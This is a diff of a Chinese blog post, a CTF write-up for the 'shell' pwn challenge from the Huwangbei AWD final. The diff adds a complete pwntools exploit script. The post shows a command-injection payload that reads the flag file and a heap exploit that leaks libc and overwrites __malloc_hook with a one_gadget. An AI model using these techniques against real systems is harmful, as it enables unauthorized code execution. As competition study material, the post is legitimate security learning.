@@ -12,13 +12,13 @@
   
 </title>
 
-<meta name="description" content="前言好久不打比赛，顺便来北京实习就参加了护网杯。排名虽然有所提高但还是被各种大表哥吊打。（和企业参赛简直痛苦）这里带来决赛中awd比赛pwn题shell的两种漏洞利用方式。 程序保护保护全开 程序分析程序模拟了一个受限shell命令行的功能。一共有8个shell功能，根据漏洞利用方式可以分为两类。第一类:ls,pwd,passwd,login,exit其中passwd和login是假的利用方式。就">
+<meta name="description" content="前言好久不打比赛，顺便来北京实习就参加了护网杯。排名虽然有所提高但还是被各种大表哥吊打。（和企业参赛简直痛苦）这里带来决赛中awd比赛pwn题shell的两种漏洞利用方式。">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="第一届护网杯线下决赛awd之shell多解">
 <meta property="og:url" content="http://yoursite.com/2018/10/25/第一届护网杯线下决赛awd之shell多解/index.html">
 <meta property="og:site_name" content="pwndog&#39;s blog">
-<meta property="og:description" content="前言好久不打比赛，顺便来北京实习就参加了护网杯。排名虽然有所提高但还是被各种大表哥吊打。（和企业参赛简直痛苦）这里带来决赛中awd比赛pwn题shell的两种漏洞利用方式。 程序保护保护全开 程序分析程序模拟了一个受限shell命令行的功能。一共有8个shell功能，根据漏洞利用方式可以分为两类。第一类:ls,pwd,passwd,login,exit其中passwd和login是假的利用方式。就">
+<meta property="og:description" content="前言好久不打比赛，顺便来北京实习就参加了护网杯。排名虽然有所提高但还是被各种大表哥吊打。（和企业参赛简直痛苦）这里带来决赛中awd比赛pwn题shell的两种漏洞利用方式。">
 <meta property="og:locale" content="CN">
 <meta property="og:image" content="http://yoursite.com/2018/10/25/第一届护网杯线下决赛awd之shell多解/1.png">
 <meta property="og:image" content="http://yoursite.com/2018/10/25/第一届护网杯线下决赛awd之shell多解/2.png">
@@ -29,10 +29,10 @@
 <meta property="og:image" content="http://yoursite.com/2018/10/25/第一届护网杯线下决赛awd之shell多解/7.png">
 <meta property="og:image" content="http://yoursite.com/2018/10/25/第一届护网杯线下决赛awd之shell多解/8.png">
 <meta property="og:image" content="http://yoursite.com/2018/10/25/第一届护网杯线下决赛awd之shell多解/9.png">
-<meta property="og:updated_time" content="2018-10-25T12:50:04.634Z">
+<meta property="og:updated_time" content="2018-10-25T12:58:31.972Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="第一届护网杯线下决赛awd之shell多解">
-<meta name="twitter:description" content="前言好久不打比赛，顺便来北京实习就参加了护网杯。排名虽然有所提高但还是被各种大表哥吊打。（和企业参赛简直痛苦）这里带来决赛中awd比赛pwn题shell的两种漏洞利用方式。 程序保护保护全开 程序分析程序模拟了一个受限shell命令行的功能。一共有8个shell功能，根据漏洞利用方式可以分为两类。第一类:ls,pwd,passwd,login,exit其中passwd和login是假的利用方式。就">
+<meta name="twitter:description" content="前言好久不打比赛，顺便来北京实习就参加了护网杯。排名虽然有所提高但还是被各种大表哥吊打。（和企业参赛简直痛苦）这里带来决赛中awd比赛pwn题shell的两种漏洞利用方式。">
 <meta name="twitter:image" content="http://yoursite.com/2018/10/25/第一届护网杯线下决赛awd之shell多解/1.png">
 
 
@@ -100,21 +100,21 @@
           
             
               <li class="category-list-container">
-                <a href="javascript:;">Category</a>
+                <a href="javascript:;">分类</a>
                 <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/glibc源码阅读/">glibc源码阅读</a><span class="category-list-count">1</span></li></ul>
               </li>
             
           
             
               <li class="tag-list-container">
-                <a href="javascript:;">Tag</a>
+                <a href="javascript:;">标签</a>
                 <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">13</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GLIBC/">GLIBC</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆/">堆</a><span class="tag-list-count">3</span></li></ul>
               </li>
             
           
             
               <li class="archive-list-container">
-                <a href="javascript:;">Archive</a>
+                <a href="javascript:;">归档</a>
                 <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">16</span></li></ul>
               </li>
             
@@ -190,7 +190,7 @@
 
   </div>
   <div class="article-entry">
-    <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>好久不打比赛，顺便来北京实习就参加了护网杯。排名虽然有所提高但还是被各种大表哥吊打。（和企业参赛简直痛苦）这里带来决赛中awd比赛pwn题shell的两种漏洞利用方式。</p>
+    <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>好久不打比赛，顺便来北京实习就参加了护网杯。排名虽然有所提高但还是被各种大表哥吊打。（和企业参赛简直痛苦）这里带来决赛中awd比赛pwn题shell的两种漏洞利用方式。<br><a id="more"></a></p>
 <h3 id="程序保护"><a href="#程序保护" class="headerlink" title="程序保护"></a>程序保护</h3><p>保护全开<br><img src="/2018/10/25/第一届护网杯线下决赛awd之shell多解/1.png" alt=""></p>
 <h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序模拟了一个受限shell命令行的功能。<br>一共有8个shell功能，根据漏洞利用方式可以分为两类。<br><img src="/2018/10/25/第一届护网杯线下决赛awd之shell多解/2.png" alt=""><br>第一类:ls,pwd,passwd,login,exit<br>其中passwd和login是假的利用方式。<br><img src="/2018/10/25/第一届护网杯线下决赛awd之shell多解/3.png" alt=""><br>就是密码通过打开random文件进行随机化。若账号密码正确则执行错误的system调用233333333333。加条知识点就是当连续open文件1024次上后，使文件描述符数组满了后，无法再次打开文件，即读取到的密码为空。这样就可以绕过密码实现登录（当然在这里登录没用）<br>第二类：recv，send，decode，encode。<br>实现通过堆的漏洞利用。</p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><p><img src="/2018/10/25/第一届护网杯线下决赛awd之shell多解/4.png" alt=""><br>ls和pwd可以组合实现任意命令执行。大佬们看见这一行指令就开始疯狂刷分了。可怜我等菜鸟没经验编自动化脚本调格式都要半天。。。<br>payload为|cat&lt;../flag即可直接获取flag这里不多解释这种方式</p>
@@ -198,13 +198,68 @@
 <p>程序一共可维持两个任意大小的堆块。malloc和free是绑定的，free掉原堆块再malloc新堆块。decode和encode用来配合使用绕过strlen限制和泄露信息。</p>
 <h5 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h5><p>awd比赛自带libc，首先泄露libc的基址。<br>先分配两个堆块，此时指针<br>malloc(0xa0)//send 指针<br>malloc(0x60)//recv 指针<br>执行一次send功能。free掉send指针再分配回来。可以得到unsorted bin的地址。再执行encode功能。通过recv功能接受send堆块的内容后通过decode泄露libc地址。<br>脚本流程如下：<br>send(0xa0,’a’)<br>recv(0x60)<br>send(0xa0,’’)<br>encode(8)<br>recv(0x60)<br>p.writeline(‘decode’)<br>p.readuntil(‘:’)<br>p.writeline(‘8’)<br>p.readuntil(‘\n’)<br>libc=u64(chr(0)+p.readuntil(‘\n’)[:-1]+chr(0)*2)-0x398B00<br>success(hex(libc))</p>
 <h5 id="漏洞实现"><a href="#漏洞实现" class="headerlink" title="漏洞实现"></a>漏洞实现</h5><p>现在我们有了libc地址，需要考虑向哪里写入one_gadget实现利用。<br>利用方式通过常见的malloc_hook加realloc_hook实现<br>初始状态：<br>chunk a //send<br>chunk b //recv<br>我们可以通过写入a覆盖b的信息。<br>首先send功能malloc一个更大值<br>状态1：<br>chunk a//空（free掉）<br>chunk b//recv<br>chunk c//send<br>之后使用recv功能占位a并通过memcpy实现溢出。<br>状态2：<br>chunk a// recv<br>chunk b//空（free掉) size 0x71<br>chunk c//send<br>将chunk c memcpy到chunk a。实现对b的溢出.将b的fd指针指向malloc_hook-0x23.中间通过encode和decode功能辅助<br>之后通过send和recv功能各malloc一个0x60的堆即可完成利用。这里有新的难点。此时不知为何free c因和topchunk合并调用malloc_consolidate产生异常。<br><img src="/2018/10/25/第一届护网杯线下决赛awd之shell多解/9.png" alt=""><br>于是通过覆盖a的同时覆盖到c。伪造一个chunk与top chunk相连。<br>这时通过send和recv功能各申请一个0x60的堆块即可写入malloc_hook.这里one_gadget环境不对，通过realloc_hook微调这里不再叙述，参考上一篇文章。</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+p=process(<span class="string">'./shell'</span>)
+elf=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.24.so'</span>)
+p.readuntil(<span class="string">'&gt; '</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(a)</span>:</span>
+    p.writeline(<span class="string">'encode'</span>)
+    p.readuntil(<span class="string">':'</span>)
+    p.writeline(str(a))
+    p.readuntil(<span class="string">'&gt; '</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(a)</span>:</span>
+    p.writeline(<span class="string">'decode'</span>)
+    p.readuntil(<span class="string">':'</span>)
+    p.writeline(str(a))
+    p.readuntil(<span class="string">'&gt; '</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(a,b)</span>:</span>
+    p.writeline(<span class="string">'send'</span>)
+    p.readuntil(<span class="string">':'</span>)
+    p.writeline(str(a))
+    p.readuntil(<span class="string">'Content'</span>)
+    p.writeline(b)
+    p.readuntil(<span class="string">'&gt; '</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">recv</span><span class="params">(a)</span>:</span>
+    p.writeline(<span class="string">'recv'</span>)
+    p.readuntil(<span class="string">':'</span>)
+    p.writeline(str(a))
+    p.readuntil(<span class="string">'&gt; '</span>)
+context(log_level=<span class="string">'debug'</span>)
+
+send(<span class="number">0xa0</span>,<span class="string">'a'</span>)
+recv(<span class="number">0x60</span>)
+send(<span class="number">0xa0</span>,<span class="string">''</span>)
+encode(<span class="number">8</span>)
+recv(<span class="number">0x60</span>)
+p.writeline(<span class="string">'decode'</span>)
+p.readuntil(<span class="string">':'</span>)
+p.writeline(<span class="string">'8'</span>)
+p.readuntil(<span class="string">'\n'</span>)
+libc=u64(chr(<span class="number">0</span>)+p.readuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]+chr(<span class="number">0</span>)*<span class="number">2</span>)<span class="number">-0x398B00</span>
+success(hex(libc))
+send(<span class="number">0x150</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(libc+elf.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)+chr(<span class="number">0</span>)*<span class="number">0x60</span>+p64(<span class="number">0x21</span>)+chr(<span class="number">0</span>)*<span class="number">0x18</span>+p64(<span class="number">0x141</span>))
+encode(<span class="number">0x150</span>)
+recv(<span class="number">0xa0</span>)
+decode(<span class="number">0x150</span>)
+re_hook=libc+elf.symbols[<span class="string">'__realloc_hook'</span>]
+mac_hook=libc+elf.symbols[<span class="string">'__malloc_hook'</span>]
+realloc=libc+elf.symbols[<span class="string">'__libc_realloc'</span>]
+send(<span class="number">0x60</span>,<span class="string">'b'</span>*(<span class="number">0x13</span><span class="number">-8</span>)+p64(libc+<span class="number">0x3f33a</span>)+p64(realloc+<span class="number">6</span>))
+encode(<span class="number">0x20</span>)
+success(hex(libc+<span class="number">0x398b00</span>))
+recv(<span class="number">0x60</span>)
+decode(<span class="number">0x20</span>)
+success(hex(libc+elf.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))
+gdb.attach(p)
+p.interactive()
+</code></pre>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>积分赛排名还好，awd日常被暴打。。和腾讯在一个分组简直是一个噩梦。膜。。如有不对请指正</p>
 
   </div>
   <footer class="article-footer">
     
   <div class="cc">
-    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.C" target="_blank" title="Attribution-ShareAlike">
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.C" target="_blank" title="署名-相同方式共享">
       <img src="/images/cc/cc.png">
       
           <img src="/images/cc/by.png">
@@ -212,7 +267,7 @@
           <img src="/images/cc/sa.png">
       
       <span>
-        This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
+        本作品采用知识共享 署名-相同方式共享 4.0 国际许可协议进行许可。
       </span>
     </a>
   </div>
